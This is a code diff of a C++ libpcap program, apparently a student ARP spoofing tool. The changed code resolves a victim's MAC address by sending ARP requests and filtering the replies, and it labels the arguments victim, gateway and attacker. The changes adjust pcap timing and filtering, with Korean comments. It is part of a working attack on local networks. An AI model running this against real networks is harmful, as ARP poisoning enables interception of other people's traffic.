@@ -35,20 +35,22 @@ EthArpPacket* sendArp(Ip sender_ip, Ip target_ip, Mac send_mac, Mac target_mac){
 	return packet;
 }
 
-int main(int argc, char* argv[]) {
+int main(int argc, char* argv[]) {	
 	if (!parse(&param, argc, argv))
 		return -1;
-	
-	Ip attacker_Ip = Ip(myIp(argv[1]));
-	Mac attacker_Mac = Mac(myMac(argv[1]));
+
+    Ip attacker_Ip = myIp(argv[1]);
+	Mac attacker_Mac = myMac(argv[1]);
 
 	char errbuf[PCAP_ERRBUF_SIZE];	
-	pcap_t* handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
+	//packet을 잡고 1초 뒤에 보인다. 그래서 실시간 처리를 하기 위해서 1로 바꾼다. 
+	pcap_t* handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", param.dev_, errbuf);
 		return -1;
 	}
 
+	//deep copy로 받기 std::String을 활용하여, 
 	for (int i = 2; i < argc; i += 2){
 		Ip sender_Ip = Ip(argv[i]);	 //victim_Mac
 		Ip target_Ip = Ip(argv[i+1]); //gateway_Mac
@@ -63,6 +65,7 @@ int main(int argc, char* argv[]) {
 		free(sendpacket);
 
 		while (true) {
+			sleep(1);
 			struct pcap_pkthdr* header;
 			const u_char* packet;
 			int res = pcap_next_ex(handle, &header, &packet);
@@ -75,9 +78,11 @@ int main(int argc, char* argv[]) {
 			EthHdr* eth = (EthHdr*)(packet);
 			ArpHdr* arp = (ArpHdr*)(packet+sizeof(EthHdr));
 			if (eth->type() != EthHdr::Arp) continue;
-			
-			if (Mac(eth->dmac()) == attacker_Mac && Ip(arp->tip()) == attacker_Ip && Ip(arp->sip()) == sender_Ip){
-				sender_Mac = Mac(eth->smac());
+
+			if (arp->op() != ArpHdr::Reply) continue;
+
+			if (eth->dmac() == attacker_Mac && arp->tip() == attacker_Ip && arp->sip() == sender_Ip){
+				sender_Mac = eth->smac();
 				break;
 			}
 		}
